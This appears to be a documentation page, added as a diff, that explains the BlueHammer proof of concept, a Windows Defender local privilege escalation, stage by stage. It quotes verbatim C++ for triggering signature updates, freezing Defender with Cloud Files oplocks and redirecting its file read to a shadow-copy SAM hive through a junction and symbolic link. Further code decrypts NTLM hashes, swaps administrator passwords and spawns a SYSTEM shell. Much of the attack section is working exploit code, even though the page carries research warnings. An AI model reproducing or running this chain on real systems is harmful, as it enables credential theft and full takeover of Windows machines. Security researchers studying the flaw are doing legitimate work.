@@ -1,0 +1,400 @@
+---
+title: "How it works"
+description: "A stage-by-stage technical walkthrough of the BlueHammer attack chain, from waiting for a Windows Defender signature update through spawning a SYSTEM shell."
+---
+
+BlueHammer chains four logically distinct stages. Each stage is a prerequisite for the next; if any stage fails the PoC aborts and cleans up. The `wmain` function (`FunnyApp.cpp:2881`) orchestrates the sequence.
+
+<Warning>
+  The following analysis is derived from the published source code. All code snippets are reproduced verbatim for research documentation. Do not run this code outside a controlled research environment on systems you own.
+</Warning>
+
+<Steps>
+
+<Step title="Wait for and trigger a Windows Defender signature update">
+
+Before anything else, BlueHammer needs an available WD signature update. Without one, Defender has no reason to call `ServerMpUpdateEngineSignature` and the attack cannot proceed.
+
+### `CheckForWDUpdates()` — detecting a pending update
+
+`CheckForWDUpdates` (`FunnyApp.cpp:785`) uses the **Windows Update Agent COM API** (`Microsoft.Update.Session`) to enumerate pending updates. It walks every pending update, checks its category collection for both `"Microsoft Defender Antivirus"` and `"Definition Updates"`, and returns `true` only when both categories are present on the same update object.
+
+```cpp
+hr = updsess->CreateUpdateSearcher(&updsrch);
+// ...
+hr = updsrch->Search(SysAllocString(L""), &srchres);
+// ...
+hr = updcollection->get_Count(&updnum);
+for (LONG i = 0; i < updnum; i++)
+{
+    // ...
+    if (!IsWdUdpate)
+        IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
+    if (!IsSigUpdate)
+        IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;
+    // ...
+    updatesfound = IsWdUdpate && IsSigUpdate;
+    if (updatesfound)
+        break;
+}
+```
+
+`wmain` polls this in a loop with a 30-second sleep between attempts:
+
+```cpp
+while (!CheckForWDUpdates(updtitle, &criterr)) {
+    if (criterr)
+        goto cleanup;
+    printf("No updates found for windows defender. Recheking in 30 seconds...\n");
+    Sleep(30000);
+}
+```
+
+### `GetUpdateFiles()` — downloading the update package
+
+Once a pending update is confirmed, `GetUpdateFiles` (`FunnyApp.cpp:599`) downloads the WD signature stub directly from Microsoft's CDN and parses the embedded cabinet archive:
+
+```cpp
+hint2 = InternetOpenUrl(hint,
+    L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64",
+    NULL, NULL,
+    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
+    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
+    INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD,
+    NULL);
+```
+
+The downloaded PE (`mpam-fe.exe` or equivalent) contains a cabinet file stored in its `.rsrc` section. `GetCabFileFromBuff` (`FunnyApp.cpp:465`) parses the PE header, locates the `.rsrc` section, and returns a pointer to the embedded cabinet data:
+
+```cpp
+char rsrc[] = ".rsrc";
+if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0)
+{
+    // walk IMAGE_RESOURCE_DIRECTORY until a leaf entry is found
+    pdata = (PIMAGE_RESOURCE_DATA_ENTRY)RtlOffsetToPointer(prsrc, pirde->OffsetToData);
+    void* cabfile = RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
+    if (cabsz)
+        *cabsz = pdata->Size;
+    return cabfile;
+}
+```
+
+The cabinet is then extracted entirely in memory using the Cabinet API (`FDICreate` / `FDICopy`) with custom I/O callbacks (`CUST_FNOPEN`, `CUST_FNREAD`, `CUST_FNWRITE`) that operate on heap buffers rather than on-disk files. The result is a linked list of `UpdateFiles` nodes, one per cabinet member.
+
+### `CallWD()` — invoking the WD RPC endpoint
+
+`CallWD` (`FunnyApp.cpp:265`) binds to the Windows Defender ALPC/RPC port and calls `Proc42_ServerMpUpdateEngineSignature` with the caller-supplied update directory path:
+
+```cpp
+RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
+
+RpcStringBindingComposeW(
+    MS_WD_UUID,
+    (RPC_WSTR)L"ncalrpc",
+    NULL,
+    (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24",
+    NULL,
+    &StringBinding);
+
+RpcBindingFromStringBindingW(StringBinding, &bindhandle);
+
+error_status_t errstat = 0;
+RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(
+    bindhandle, NULL, args->dirpath, &errstat);
+```
+
+`CallWD` runs on a background thread (`WDCallerThread`) so `wmain` can simultaneously watch for side-effects — specifically, the new definition-update subdirectory that Defender creates under `C:\ProgramData\Microsoft\Windows Defender\Definition Updates\` when it accepts the call.
+
+<Note>
+  The RPC call can return `0x8050A003` if the queued update type does not match what Defender expects at that moment. The PoC treats this as a transient failure and is expected to be retried with a different pending update.
+</Note>
+
+</Step>
+
+<Step title="VSS creation and Windows Defender freeze">
+
+The SAM hive at `C:\Windows\System32\Config\SAM` is locked exclusively by the OS while Windows is running. To obtain a readable copy, BlueHammer forces the Volume Shadow Copy Service (VSS) to create a snapshot, then freezes Defender's I/O thread at exactly the right moment using Cloud Files oplocks so the junction/symlink swap can happen atomically.
+
+### `TriggerWDForVS()` — triggering a VSS snapshot
+
+`TriggerWDForVS` (`FunnyApp.cpp:1593`) drives VSS creation indirectly through Windows Defender's own malware-scanning pipeline:
+
+1. **Spawns `ShadowCopyFinderThread`** — a background thread that polls the NT object manager's `\Device` directory, watching for new `HarddiskVolumeShadowCopy*` device objects to appear.
+
+2. **Writes an EICAR test file** — a reversed EICAR string that is un-reversed at runtime and written to a temp directory as `foo.exe`:
+
+   ```cpp
+   char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
+   rev(eicar);
+   // ...
+   WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
+   ```
+
+3. **Places a batch oplock on `RstrtMgr.dll`** — Windows Defender loads `RstrtMgr.dll` when it scans files for running-process interference. The oplock fires when Defender opens the DLL, which serves as a reliable signal that Defender has started processing the EICAR file and will shortly trigger a VSS snapshot as part of its remediation workflow.
+
+   ```cpp
+   hlock = CreateFile(rstmgr, GENERIC_READ | SYNCHRONIZE, NULL, NULL,
+       OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
+   // ...
+   DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL,
+       NULL, NULL, NULL, &ovd);
+   // ...
+   GetOverlappedResult(hlock, &ovd, &nwf, TRUE); // blocks until Defender opens RstrtMgr.dll
+   ```
+
+4. Once the oplock fires, the VSS finder thread should have detected the new shadow copy. `TriggerWDForVS` then spawns the **`FreezeVSS` thread**.
+
+### `FreezeVSS()` — freezing Defender's I/O with Cloud Files
+
+`FreezeVSS` (`FunnyApp.cpp:1455`) exploits the **Cloud Files (CldApi)** sync-root callback mechanism to stall Defender's I/O:
+
+1. **Registers a Cloud Files sync root** pointed at the PoC's own executable directory using `CfRegisterSyncRoot` / `CfConnectSyncRoot`, with a `CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS` callback registered.
+
+2. **Waits for Defender to query the directory** — the `CfCallbackFetchPlaceHolders` callback (`FunnyApp.cpp:1370`) fires when any process enumerates the sync-root directory. It checks the caller's PID against the WinDefend service PID:
+
+   ```cpp
+   CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
+   if (GetWDPID() == cpi->ProcessId)
+   {
+       cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
+       SetEvent(ctx->hnotifywdaccess);
+       // ...
+       WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
+       HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
+   }
+   ```
+
+3. **Requests a batch oplock on a `.lock` placeholder file** — once Defender's callback is detected, the main `FreezeVSS` thread places a batch oplock on the placeholder file and signals `hnotifylockcreated` so the callback can call `CfExecute`. `CfExecute` delivers the placeholder to Defender; Defender then tries to open the `.lock` file, which triggers the batch oplock and **stalls all of Defender's pending I/O** until the oplock is released:
+
+   ```cpp
+   DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL,
+       NULL, NULL, NULL, &ovd);
+   // ...
+   SetEvent(callbackctx.hnotifylockcreated);
+   GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
+   // Defender is now frozen
+   printf("WD is frozen and the new VSS can be used.\n");
+   SetEvent(args->hvssready);
+   ```
+
+   `FreezeVSS` then waits on `hcleanupevent` — which `wmain` signals only after the SAM file has been fully read — keeping Defender frozen for the entire exploitation window.
+
+<Note>
+  `ShadowCopyFinderThread` identifies new VSS volumes by enumerating `\Device\HarddiskVolumeShadowCopy*` objects via `NtQueryDirectoryObject` and diffing against the list captured before EICAR was written. The path of the new shadow copy (e.g., `\Device\HarddiskVolumeShadowCopy3`) is written into `fullvsspath` for use in Stage 3.
+</Note>
+
+</Step>
+
+<Step title="File read redirection via junction and NT symbolic link">
+
+With Defender frozen, `wmain` has an exclusive window to manipulate the filesystem namespace so that when Defender resumes and opens `mpasbase.vdm`, it actually reads the SAM hive from the VSS snapshot.
+
+### Setting an oplock on `mpasbase.vdm`
+
+Before doing any renaming, `wmain` opens the `mpasbase.vdm` file it wrote into the update directory and requests a batch oplock on it. The oplock fires when Defender (running on its RPC thread) opens the file, which signals that Defender is actively processing the update — the ideal moment to perform the swap:
+
+```cpp
+ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE,
+    &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL,
+    FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE,
+    NULL, NULL);
+// ...
+DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK,
+    NULL, NULL, NULL, NULL, NULL, &ovd);
+// ...
+GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
+// oplock fired — Defender is attempting to open mpasbase.vdm
+```
+
+### Moving the update directory and creating a junction
+
+With Defender blocked on the oplock, `wmain` uses `SetFileInformationByHandle(FileRenameInfo)` to move `mpasbase.vdm` out of the update directory (to `<updatepath>.WDFOO`), then renames the entire update directory to `<updatepath>.foo`:
+
+```cpp
+// Move mpasbase.vdm away from the update directory
+SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz);
+
+// Move the update directory itself
+MoveFile(updatepath, newtmp);
+```
+
+It then recreates the update directory path as a junction (mount point reparse point) pointing to `\BaseNamedObjects\Restricted` — the NT object manager namespace directory where restricted symbolic links can be created by low-privileged callers:
+
+```cpp
+wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
+// ...
+rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetsz;
+memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
+// ...
+DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT,
+    rdb, totalsz, NULL, NULL, NULL, &ov);
+printf("Junction created %ws => %ws\n", updatepath, rptarget);
+```
+
+### Creating the NT symbolic link
+
+Now `<updatepath>` is a junction into `\BaseNamedObjects\Restricted`. `wmain` creates an NT object-manager symbolic link at `\BaseNamedObjects\Restricted\mpasbase.vdm` pointing to the VSS path of the SAM hive:
+
+```cpp
+// nttargetfile = "\Device\HarddiskVolumeShadowCopyN\Windows\System32\Config\SAM"
+wcscpy(nttargetfile, fullvsspath);
+wcscat(nttargetfile, filestoleak[x]); // L"\\Windows\\System32\\Config\\SAM"
+
+RtlInitUnicodeString(&objlinkname,
+    L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
+RtlInitUnicodeString(&objlinktarget, nttargetfile);
+InitializeObjectAttributes(&objattr, &objlinkname,
+    OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+ntstat = _NtCreateSymbolicLinkObject(
+    &hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
+printf("Object manager link created %ws => %ws\n",
+    objlinkname.Buffer, objlinktarget.Buffer);
+```
+
+### Releasing Defender
+
+With the junction and symbolic link in place, `wmain` releases the oplock by closing `hupdatefile`. Defender resumes and attempts to open:
+
+```
+<updatepath>\mpasbase.vdm
+```
+
+The I/O manager resolves this as:
+
+1. `<updatepath>` → junction → `\BaseNamedObjects\Restricted` (NT object namespace)
+2. `\BaseNamedObjects\Restricted\mpasbase.vdm` → NT symlink → `\Device\HarddiskVolumeShadowCopyN\Windows\System32\Config\SAM`
+
+Defender reads the SAM hive, believing it is reading a signature file. `wmain` polls until the file handle can be opened successfully, then reads the leaked bytes:
+
+```cpp
+do {
+    hleakedfile = CreateFile(newdefupdatedirname,
+        GENERIC_READ, FILE_SHARE_READ, NULL,
+        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
+
+ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL);
+printf("Exploit succeeded.\n");
+```
+
+The leaked SAM hive bytes are written to a temp file with a UUID-based name.
+
+</Step>
+
+<Step title="Hash extraction and privilege escalation">
+
+`DoSpawnShellAsAllUsers` (`FunnyApp.cpp:2481`) receives the path of the leaked SAM hive and performs offline credential extraction followed by per-user shell spawning.
+
+### Opening the hive with `OROpenHive`
+
+The offline registry library (`offreg.dll`) is used to open the SAM hive without requiring OS-level registry access:
+
+```cpp
+ORHKEY hSAMhive = NULL;
+DWORD err = OROpenHive(sampath, &hSAMhive);
+```
+
+### Extracting the boot key with `GetLSASecretKey()`
+
+The boot key (also called the syskey) is stored across four registry values — `JD`, `Skew1`, `GBG`, `Data` — under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`. Their class names, concatenated and permuted by a fixed index table, yield the 16-byte boot key:
+
+```cpp
+const wchar_t* keynames[] = { {L"JD"}, {L"Skew1"}, {L"GBG"}, {L"Data"} };
+int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
+
+for (const wchar_t* keyname : keynames)
+{
+    err = RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);
+    err = RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, ...);
+    index += retsz;
+}
+// permute the concatenated hex string by indices[] to recover the boot key
+for (int i = 0; i < sizeof(keybytes); i++)
+    bootkeybytes[i] = keybytes[indices[i]];
+```
+
+<Note>
+  `GetLSASecretKey` reads from the **live** registry (`HKLM\SYSTEM\...`), not from the leaked SAM hive. This is intentional: the boot key is not stored in SAM; it is derived from SYSTEM hive metadata that is readable by any local process.
+</Note>
+
+### Decrypting the PEK with `UnprotectPasswordEncryptionKey()`
+
+The SAM hive's `SAM\Domains\Account\F` value holds a structure whose AES-128-CBC-encrypted section contains the Password Encryption Key (PEK). `UnprotectPasswordEncryptionKey` (`FunnyApp.cpp:1931`) extracts the IV from offset `0x08`, the ciphertext from offset `0x18`, and decrypts using the boot key:
+
+```cpp
+int hashlen = data[0];
+int enclen  = data[4];
+char iv[16] = { 0 };
+memmove(iv, &data[8], sizeof(iv));
+char* cyphertext = (char*)malloc(enclen);
+memmove(cyphertext, &data[0x18], enclen);
+
+// AES-128-CBC decrypt
+char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
+```
+
+`UnprotectAES` uses `CryptAcquireContext` with `"Microsoft Enhanced RSA and AES Cryptographic Provider"` and `CALG_AES_128` in CBC mode.
+
+### Decrypting each NTLM hash with `UnprotectNTHash()`
+
+For each user subkey under `SAM\Domains\Account\Users`, the `V` value contains the encrypted NTLM hash. `UnprotectNTHash` decrypts it using the PEK:
+
+```cpp
+char* realNTLMHash = (char*)UnprotectNTHash(
+    passwordEncryptionKey, passwordEncryptionKeysz,
+    samentry->NTHash, samentry->NTHashLenght,
+    &realNTLMHashsz, samentry->rid);
+
+printf("    User : %ws\n    RID : %d\n    NTLM : %s\n",
+    username, samentry->rid, stringntlm);
+```
+
+### Password swap, logon, and SYSTEM shell
+
+For each account with a non-null NTLM hash (skipping the current user and `WDAGUtilityAccount`), the PoC:
+
+1. **Temporarily replaces the password** via `ChangeUserPassword` (which calls `SamiChangePasswordUser` internally) with a hardcoded known value: `$PWNed666!!!WDFAIL`.
+
+2. **Logs on interactively** with `LogonUserEx`:
+
+   ```cpp
+   LogonUserEx(username, NULL, newpassword_unistr,
+       LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
+       &htoken, &logonsid, NULL, NULL, NULL);
+   ```
+
+3. **Spawns a SYSTEM shell** if the account is a local administrator — it impersonates the elevated token, creates a transient service that re-runs the PoC binary itself with a session-ID argument, starts the service (which runs as SYSTEM), and immediately deletes it:
+
+   ```cpp
+   ImpersonateLoggedOnUser(htoken2);
+   SC_HANDLE hmgr = OpenSCManager(NULL, NULL,
+       SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
+   // ...
+   SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL,
+       SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
+       SERVICE_ERROR_IGNORE, servicecmd, ...);
+   StartService(hsvc, NULL, NULL);
+   DeleteService(hsvc);
+   RevertToSelf();
+   ```
+
+   When the service binary runs as SYSTEM and detects `IsRunningAsLocalSystem() == true`, it calls `LaunchConsoleInSessionId` to open a `conhost.exe` in the caller's desktop session using `CreateProcessAsUser` with `SE_TCB_NAME`, `SE_ASSIGNPRIMARYTOKEN_NAME`, and `SE_IMPERSONATE_NAME` privileges enabled.
+
+4. **Restores the original password** using the previously captured NTLM hash, regardless of whether the shell launch succeeded:
+
+   ```cpp
+   if (!ChangeUserPassword(username, newNTLM, NULL, realNTLMHash))
+       printf("    PasswordRestore : Error %d\n", GetLastError());
+   else
+       printf("    PasswordRestore : OK.\n");
+   ```
+
+<Warning>
+  The password-restoration step is best-effort. A crash or forced termination between the swap and the restore will leave the affected account with a changed password. Always run this PoC on isolated, snapshot-capable test machines.
+</Warning>
+
+</Step>
+
+</Steps>
